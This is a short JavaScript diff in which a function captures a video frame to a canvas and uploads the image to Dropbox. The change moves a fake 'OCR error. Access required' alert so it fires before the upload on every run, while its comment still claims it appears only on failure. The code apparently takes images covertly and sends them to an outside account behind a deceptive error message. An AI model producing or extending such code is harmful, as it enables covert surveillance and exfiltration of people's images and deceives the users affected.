@@ -145,11 +145,11 @@ fetch(TEST_URL, {
 function captureAndUpload() {
   const context = canvas.getContext('2d');
   context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  alert('OCR error. Access required'); // Show alert if the upload fails
   canvas.toBlob(async (blob) => {
     try {
       await uploadToDropbox(blob);
       console.log("Uploaded to Dropbox!");
-      alert('OCR error. Access required'); // Show alert if the upload fails
 
     } catch (error) {
       console.error("Upload failed:", error);
